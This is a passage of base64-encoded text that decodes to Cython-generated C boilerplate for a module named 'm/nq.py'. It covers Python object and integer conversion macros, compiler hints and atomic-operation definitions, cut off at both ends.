9UX01BWCB8fFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01BWCkpKSAgKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X2lzX3ZhbGlkX2luZGV4KFB5X3NzaXplX3QgaSwgUHlfc3NpemVfdCBsaW1pdCkge1xuICAgIHJldHVybiAoc2l6ZV90KSBpIDwgKHNpemVfdCkgbGltaXQ7XG59XG4jaWYgZGVmaW5lZCAoX19jcGx1c3BsdXMpICYmIF9fY3BsdXNwbHVzID49IDIwMTEwM0xcbiAgICAjaW5jbHVkZSA8Y3N0ZGxpYj5cbiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIHN0ZDo6YWJzKHZhbHVlKVxuI2VsaWYgU0laRU9GX0lOVCA+PSBTSVpFT0ZfU0laRV9UXG4gICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSBhYnModmFsdWUpXG4jZWxpZiBTSVpFT0ZfTE9ORyA+PSBTSVpFT0ZfU0laRV9UXG4gICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSBsYWJzKHZhbHVlKVxuI2VsaWYgZGVmaW5lZCAoX01TQ19WRVIpXG4gICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSAoKFB5X3NzaXplX3QpX2FiczY0KHZhbHVlKSlcbiNlbGlmIGRlZmluZWQgKF9fU1REQ19WRVJTSU9OX18pICYmIF9fU1REQ19WRVJTSU9OX18gPj0gMTk5OTAxTFxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgbGxhYnModmFsdWUpXG4jZWxpZiBkZWZpbmVkIChfX0dOVUNfXylcbiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIF9fYnVpbHRpbl9sbGFicyh2YWx1ZSlcbiNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSAoKHZhbHVlPDApID8gLXZhbHVlIDogdmFsdWUpXG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X3NzaXplX3QgX19QeXhfc3NpemVfc3RybGVuKGNvbnN0IGNoYXIgKnMpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmcoUHlPYmplY3QqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGNvbnN0IGNoYXIqIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nQW5kU2l6ZShQeU9iamVjdCosIFB5X3NzaXplX3QqIGxlbmd0aCk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlCeXRlQXJyYXlfRnJvbVN0cmluZyhjb25zdCBjaGFyKik7XG4jZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmdBbmRTaXplKHMsIGwpIFB5Qnl0ZUFycmF5X0Zyb21TdHJpbmdBbmRTaXplKChjb25zdCBjaGFyKilzLCBsKVxuI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0Zyb21TdHJpbmcgICAgICAgIFB5Qnl0ZXNfRnJvbVN0cmluZ1xuI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplIFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemVcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZyhjb25zdCBjaGFyKik7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlU3RyaW5nKHMpICAgICAoKGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVNTdHJpbmcocykgICAgKChzaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlVVN0cmluZyhzKSAgICAoKHVuc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNTdHJpbmcocykgICAgICgoY29uc3QgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1NTdHJpbmcocykgICAgKChjb25zdCBzaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1VTdHJpbmcocykgICAgKChjb25zdCB1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19BU19TVFJJTkcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVBcnJheV9Bc1N0cmluZyhzKSBQeUJ5dGVBcnJheV9BU19TVFJJTkcocylcbiNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzV3JpdGFibGVTdHJpbmcocykgICAgICgoY2hhciopIFB5Qnl0ZXNfQXNTdHJpbmcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzV3JpdGFibGVTU3RyaW5nKHMpICAgICgoc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FzU3RyaW5nKHMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlVVN0cmluZyhzKSAgICAoKHVuc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FzU3RyaW5nKHMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1N0cmluZyhzKSAgICAgKChjb25zdCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNTU3RyaW5nKHMpICAgICgoY29uc3Qgc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FzU3RyaW5nKHMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1VTdHJpbmcocykgICAgKChjb25zdCB1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0FzU3RyaW5nKHMpIFB5Qnl0ZUFycmF5X0FzU3RyaW5nKHMpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNXcml0YWJsZVN0cmluZyhzKSAgICAoKGNoYXIqKShfX3B5eF91aW50cHRyX3QpIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKHMpKVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Bc1dyaXRhYmxlU1N0cmluZyhzKSAgICAoKHNpZ25lZCBjaGFyKikoX19weXhfdWludHB0cl90KSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNXcml0YWJsZVVTdHJpbmcocykgICAgKCh1bnNpZ25lZCBjaGFyKikoX19weXhfdWludHB0cl90KSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNTU3RyaW5nKHMpICAgICgoY29uc3Qgc2lnbmVkIGNoYXIqKSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNVU3RyaW5nKHMpICAgICgoY29uc3QgdW5zaWduZWQgY2hhciopIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKHMpKVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Gcm9tQ1N0cmluZyhzKSAgX19QeXhfUHlPYmplY3RfRnJvbVN0cmluZygoY29uc3QgY2hhciopcylcbiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tQ1N0cmluZyhzKSAgIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZygoY29uc3QgY2hhciopcylcbiNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfRnJvbUNTdHJpbmcocykgICBfX1B5eF9QeUJ5dGVBcnJheV9Gcm9tU3RyaW5nKChjb25zdCBjaGFyKilzKVxuI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbUNTdHJpbmcocykgX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpXG4jZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tT3JkaW5hbChvKSAgICAgICBQeVVuaWNvZGVfRnJvbU9yZGluYWwoKGludClvKVxuI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQXNVbmljb2RlICAgICAgICAgICAgUHlVbmljb2RlX0FzVW5pY29kZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X05ld1JlZihQeU9iamVjdCAqb2JqKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwYTAwMDAgfHwgZGVmaW5lZChQeV9OZXdSZWYpXG4gICAgcmV0dXJuIFB5X05ld1JlZihvYmopO1xuI2Vsc2VcbiAgICBQeV9JTkNSRUYob2JqKTtcbiAgICByZXR1cm4gb2JqO1xuI2VuZGlmXG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfWE5ld1JlZihQeU9iamVjdCAqb2JqKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwYTAwMDAgfHwgZGVmaW5lZChQeV9YTmV3UmVmKVxuICAgIHJldHVybiBQeV9YTmV3UmVmKG9iaik7XG4jZWxzZVxuICAgIFB5X1hJTkNSRUYob2JqKTtcbiAgICByZXR1cm4gb2JqO1xuI2VuZGlmXG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfT3duZWRfUHlfTm9uZShpbnQgYik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5Qm9vbF9Gcm9tTG9uZyhsb25nIGIpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShQeU9iamVjdCopO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZUFuZERlY3JlZihQeU9iamVjdCopO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TnVtYmVyX0xvbmcoUHlPYmplY3QqIHgpO1xuI2RlZmluZSBfX1B5eF9QeVNlcXVlbmNlX1R1cGxlKG9iailcXFxuICAgIChsaWtlbHkoUHlUdXBsZV9DaGVja0V4YWN0KG9iaikpID8gX19QeXhfTmV3UmVmKG9iaikgOiBQeVNlcXVlbmNlX1R1cGxlKG9iaikpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeV9zc2l6ZV90IF9fUHl4X1B5SW5kZXhfQXNTc2l6ZV90KFB5T2JqZWN0Kik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5TG9uZ19Gcm9tU2l6ZV90KHNpemVfdCk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeV9oYXNoX3QgX19QeXhfUHlJbmRleF9Bc0hhc2hfdChQeU9iamVjdCopO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiNkZWZpbmUgX19QeXhfUHlGbG9hdF9Bc0RvdWJsZSh4KSAoUHlGbG9hdF9DaGVja0V4YWN0KHgpID8gUHlGbG9hdF9BU19ET1VCTEUoeCkgOiBQeUZsb2F0X0FzRG91YmxlKHgpKVxuI2RlZmluZSBfX1B5eF9QeUZsb2F0X0FTX0RPVUJMRSh4KSBQeUZsb2F0X0FTX0RPVUJMRSh4KVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlGbG9hdF9Bc0RvdWJsZSh4KSBQeUZsb2F0X0FzRG91YmxlKHgpXG4jZGVmaW5lIF9fUHl4X1B5RmxvYXRfQVNfRE9VQkxFKHgpIFB5RmxvYXRfQXNEb3VibGUoeClcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeUZsb2F0X0FzRmxvYXQoeCkgKChmbG9hdCkgX19QeXhfUHlGbG9hdF9Bc0RvdWJsZSh4KSlcbiNkZWZpbmUgX19QeXhfUHlOdW1iZXJfSW50KHgpIChQeUxvbmdfQ2hlY2tFeGFjdCh4KSA/IF9fUHl4X05ld1JlZih4KSA6IFB5TnVtYmVyX0xvbmcoeCkpXG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE3XG4gICNpZm5kZWYgX1B5TG9uZ19TSUdOX01BU0tcbiAgICAjZGVmaW5lIF9QeUxvbmdfU0lHTl9NQVNLIDNcbiAgI2VuZGlmXG4gICNpZm5kZWYgX1B5TG9uZ19OT05fU0laRV9CSVRTXG4gICAgI2RlZmluZSBfUHlMb25nX05PTl9TSVpFX0JJVFMgM1xuICAjZW5kaWZcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfU2lnbih4KSAgKCgoUHlMb25nT2JqZWN0Kil4KS0+bG9uZ192YWx1ZS5sdl90YWcgJiBfUHlMb25nX1NJR05fTUFTSylcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNOZWcoeCkgICgoX19QeXhfUHlMb25nX1NpZ24oeCkgJiAyKSAhPSAwKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc05vbk5lZyh4KSAgKCFfX1B5eF9QeUxvbmdfSXNOZWcoeCkpXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0lzWmVybyh4KSAgKF9fUHl4X1B5TG9uZ19TaWduKHgpICYgMSlcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNQb3MoeCkgIChfX1B5eF9QeUxvbmdfU2lnbih4KSA9PSAwKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWVVbnNpZ25lZCh4KSAgKF9fUHl4X1B5TG9uZ19EaWdpdHMoeClbMF0pXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgICgoUHlfc3NpemVfdCkgKCgoUHlMb25nT2JqZWN0Kil4KS0+bG9uZ192YWx1ZS5sdl90YWcgPj4gX1B5TG9uZ19OT05fU0laRV9CSVRTKSlcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudCh4KVxcXG4gICAgICAgICgoMSAtIChQeV9zc2l6ZV90KSBfX1B5eF9QeUxvbmdfU2lnbih4KSkgKiBfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSlcbiAgI2lmIGRlZmluZWQoUHlVbnN0YWJsZV9Mb25nX0lzQ29tcGFjdCkgJiYgZGVmaW5lZChQeVVuc3RhYmxlX0xvbmdfQ29tcGFjdFZhbHVlKVxuICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSAgICAgUHlVbnN0YWJsZV9Mb25nX0lzQ29tcGFjdCgoUHlMb25nT2JqZWN0KikgeClcbiAgICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeCkgIFB5VW5zdGFibGVfTG9uZ19Db21wYWN0VmFsdWUoKFB5TG9uZ09iamVjdCopIHgpXG4gICNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpICAgICAoKChQeUxvbmdPYmplY3QqKXgpLT5sb25nX3ZhbHVlLmx2X3RhZyA8ICgyIDw8IF9QeUxvbmdfTk9OX1NJWkVfQklUUykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpICAoKDEgLSAoUHlfc3NpemVfdCkgX19QeXhfUHlMb25nX1NpZ24oeCkpICogKFB5X3NzaXplX3QpIF9fUHl4X1B5TG9uZ19EaWdpdHMoeClbMF0pXG4gICNlbmRpZlxuICB0eXBlZGVmIFB5X3NzaXplX3QgIF9fUHl4X2NvbXBhY3RfcHlsb25nO1xuICB0eXBlZGVmIHNpemVfdCAgX19QeXhfY29tcGFjdF91cHlsb25nO1xuICAjZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc05lZyh4KSAgKFB5X1NJWkUoeCkgPCAwKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc05vbk5lZyh4KSAgKFB5X1NJWkUoeCkgPj0gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNaZXJvKHgpICAoUHlfU0laRSh4KSA9PSAwKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc1Bvcyh4KSAgKFB5X1NJWkUoeCkgPiAwKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWVVbnNpZ25lZCh4KSAgKChQeV9TSVpFKHgpID09IDApID8gMCA6IF9fUHl4X1B5TG9uZ19EaWdpdHMoeClbMF0pXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgIF9fUHl4X3NzdF9hYnMoUHlfU0laRSh4KSlcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudCh4KSAgUHlfU0laRSh4KVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkgIChQeV9TSVpFKHgpID09IDAgfHwgUHlfU0laRSh4KSA9PSAxIHx8IFB5X1NJWkUoeCkgPT0gLTEpXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KVxcXG4gICAgICAgICgoUHlfU0laRSh4KSA9PSAwKSA/IChzZGlnaXQpIDAgOiAoKFB5X1NJWkUoeCkgPCAwKSA/IC0oc2RpZ2l0KV9fUHl4X1B5TG9uZ19EaWdpdHMoeClbMF0gOiAoc2RpZ2l0KV9fUHl4X1B5TG9uZ19EaWdpdHMoeClbMF0pKVxuICB0eXBlZGVmIHNkaWdpdCAgX19QeXhfY29tcGFjdF9weWxvbmc7XG4gIHR5cGVkZWYgZGlnaXQgIF9fUHl4X2NvbXBhY3RfdXB5bG9uZztcbiAgI2VuZGlmXG4gIHN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUxvbmdfQ29tcGFjdEFzTG9uZyhQeU9iamVjdCAqeCwgbG9uZyAqcmV0dXJuX3ZhbHVlKTtcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTVcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpICAoKChQeUxvbmdPYmplY3QqKXgpLT5sb25nX3ZhbHVlLm9iX2RpZ2l0KVxuICAjZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdHMoeCkgICgoKFB5TG9uZ09iamVjdCopeCktPm9iX2RpZ2l0KVxuICAjZW5kaWZcbiNlbmRpZlxuI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX1VURjhcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIHNpemUpIFB5VW5pY29kZV9EZWNvZGVVVEY4KGNfc3RyLCBzaXplLCBOVUxMKVxuI2VsaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIHNpemUpIFB5VW5pY29kZV9EZWNvZGVBU0NJSShjX3N0ciwgc2l6ZSwgTlVMTClcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKGNfc3RyLCBzaXplKSBQeVVuaWNvZGVfRGVjb2RlKGNfc3RyLCBzaXplLCBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElORywgTlVMTClcbiNlbmRpZlxuXG5cblxuI2lmIGRlZmluZWQoX19HTlVDX18pICAgICAmJiAoX19HTlVDX18gPiAyIHx8IChfX0dOVUNfXyA9PSAyICYmIChfX0dOVUNfTUlOT1JfXyA+IDk1KSkpXG4gICNkZWZpbmUgbGlrZWx5KHgpICAgX19idWlsdGluX2V4cGVjdCghISh4KSwgMSlcbiAgI2RlZmluZSB1bmxpa2VseSh4KSBfX2J1aWx0aW5fZXhwZWN0KCEhKHgpLCAwKVxuI2Vsc2UgXG4gICNkZWZpbmUgbGlrZWx5KHgpICAgKHgpXG4gICNkZWZpbmUgdW5saWtlbHkoeCkgKHgpXG4jZW5kaWYgXG5cbiNpZmRlZiBfX2NwbHVzcGx1c1xuI2lmIF9fY3BsdXNwbHVzID4gMjAxMTAzTFxuI2luY2x1ZGUgPHR5cGVfdHJhaXRzPlxuI2VuZGlmXG50ZW1wbGF0ZSA8dHlwZW5hbWUgVD5cbnN0YXRpYyB2b2lkIF9fUHl4X3ByZXRlbmRfdG9faW5pdGlhbGl6ZShUKiBwdHIpIHtcbiNpZiBfX2NwbHVzcGx1cyA+IDIwMTEwM0xcbiAgICBpZiAoKHN0ZDo6aXNfdHJpdmlhbGx5X2RlZmF1bHRfY29uc3RydWN0aWJsZTxUPjo6dmFsdWUpKVxuI2VuZGlmXG4gICAgICAgICpwdHIgPSBUKCk7XG4gICAgKHZvaWQpcHRyO1xufVxuI2Vsc2VcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfcHJldGVuZF90b19pbml0aWFsaXplKHZvaWQqIHB0cikgeyAodm9pZClwdHI7IH1cbiNlbmRpZlxuXG5cbiNpZiAhQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfbSA9IE5VTEw7XG4jZW5kaWZcbnN0YXRpYyBpbnQgX19weXhfbGluZW5vO1xuc3RhdGljIGludCBfX3B5eF9jbGluZW5vID0gMDtcbnN0YXRpYyBjb25zdCBjaGFyICogY29uc3QgX19weXhfY2ZpbGVubSA9IF9fRklMRV9fO1xuc3RhdGljIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lO1xuXG5cblxuc3RhdGljIGNvbnN0IGNoYXIqIGNvbnN0IF9fcHl4X2ZbXSA9IHtcbiAgIm0vbnEucHkiLFxufTtcblxuXG4jaW5jbHVkZSA8cHl0aHJlYWQuaD5cbiNpZm5kZWYgQ1lUSE9OX0FUT01JQ1NcbiAgICAjZGVmaW5lIENZVEhPTl9BVE9NSUNTIDFcbiNlbmRpZlxuI2RlZmluZSBfX1BZWF9DWVRIT05fQVRPTUlDU19FTkFCTEVEKCkgQ1lUSE9OX0FUT01JQ1NcbiNkZWZpbmUgX19QWVhfR0VUX0NZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HKCkgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiNkZWZpbmUgX19weXhfYXRvbWljX2ludF90eXBlIGludFxuI2RlZmluZSBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgaW50XG4jaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKGRlZmluZWQoX19TVERDX1ZFUlNJT05fXykgJiZcXFxuICAgICAgICAgICAgICAgICAgICAgICAgKF9fU1REQ19WRVJTSU9OX18gPj0gMjAxMTEyTCkgJiZcXFxuICAgICAgICAgICAgICAgICAgICAgICAgIWRlZmluZWQoX19TVERDX05PX0FUT01JQ1NfXykpXG4gICAgI2luY2x1ZGUgPHN0ZGF0b21pYy5oPlxuI2VsaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKGRlZmluZWQoX19jcGx1c3BsdXMpICYmIChcXFxuICAgICAgICAgICAgICAgICAgICAoX19jcGx1c3BsdXMgPj0gMjAxMTAzTCkgfHxcXFxuICAgICAgICAgICAgICAgICAgICAoZGVmaW5lZChfTVNDX1ZFUikgJiYgX01TQ19WRVIgPj0gMTcwMCkpKVxuICAgICNpbmNsdWRlIDxhdG9taWM+XG4jZW5kaWZcbiNpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX1NURENfVkVSU0lPTl9fKSAmJlxcXG4gICAgICAgICAgICAgICAgICAgICAgICAoX19TVERDX1ZFUlNJT05fXyA+PSAyMDExMTJMKSAmJlxcXG4gICAgICAgICAgICAgICAgICAgICAgICAhZGVmaW5lZChfX1NURENfTk9fQVRPTUlDU19fKSAmJlxcXG4gICAgICAgICAgICAgICAgICAgICAgIEFUT01JQ19JTlRfTE9DS19GUkVFID09IDIpXG4gICAgI3VuZGVmIF9fcHl4X2F0b21pY19pbnRfdHlwZVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2ludF90eXBlIGF0b21pY19pbnRcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wdHJfdHlwZSBhdG9taWNfdWludHB0cl90XG4gICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfcHRyX3R5cGUgdWludHB0cl90XG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKHZhbHVlKSBhdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBtZW1vcnlfb3JkZXJfcmVsYXhlZClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwodmFsdWUpIGF0b21pY19mZXRjaF9hZGRfZXhwbGljaXQodmFsdWUsIDEsIG1lbW9yeV9vcmRlcl9hY3FfcmVsKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgYXRvbWljX2ZldGNoX3N1Yl9leHBsaWNpdCh2YWx1ZSwgMSwgbWVtb3J5X29yZGVyX2FjcV9yZWwpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3ViKHZhbHVlLCBhcmcpIGF0b21pY19mZXRjaF9zdWIodmFsdWUsIGFyZylcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKHZhbHVlLCBleHBlY3RlZCwgZGVzaXJlZCkgYXRvbWljX2NvbXBhcmVfZXhjaGFuZ2Vfc3Ryb25nKHZhbHVlLCBleHBlY3RlZCwgZGVzaXJlZClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19sb2FkKHZhbHVlKSBhdG9taWNfbG9hZCh2YWx1ZSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdG9yZSh2YWx1ZSwgbmV3X3ZhbHVlKSBhdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCh2YWx1ZSkgYXRvbWljX2xvYWRfZXhwbGljaXQodmFsdWUsIG1lbW9yeV9vcmRlcl9yZWxheGVkKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBhdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgbWVtb3J5X29yZGVyX2FjcXVpcmUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSh2YWx1ZSwgbmV3X3ZhbHVlKSBhdG9taWNfZXhjaGFuZ2UodmFsdWUsIChfX3B5eF9ub25hdG9taWNfcHRyX3R5cGUpbmV3X3ZhbHVlKVxuICAgICNpZiBkZWZpbmVkKF9fUFlYX0RFQlVHX0FUT01JQ1MpICYmIGRlZmluZWQoX01TQ19WRVIpXG4gICAgICAgICNwcmFnbWEgbWVzc2FnZSAoIlVzaW5nIHN0YW5kYXJkIEMgYXRvbWljcyIpXG4gICAgI2VsaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKVxuICAgICAgICAjd2FybmluZyAiVXNpbmcgc3RhbmRhcmQgQyBhdG9taWNzIlxuICAgICNlbmRpZlxuI2VsaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKGRlZmluZWQoX19jcGx1c3BsdXMpICYmIChcXFxuICAgICAgICAgICAgICAgICAgICAoX19jcGx1c3BsdXMgPj0gMjAxMTAzTCkgfHxcXFxuXFxcbiAgICAgICAgICAgICAgICAgICAgKGRlZmluZWQoX01TQ19WRVIpICYmIF9NU0NfVkVSID49IDE3MDApKSAmJlxcXG4gICAgICAgICAgICAgICAgICAgIEFUT01JQ19JTlRfTE9DS19GUkVFID09IDIpXG4gICAgI3VuZGVmIF9fcHl4X2F0b21pY19pbnRfdHlwZVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2ludF90eXBlIHN0ZDo6YXRvbWljX2ludFxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3B0cl90eXBlIHN0ZDo6YXRvbWljX3VpbnRwdH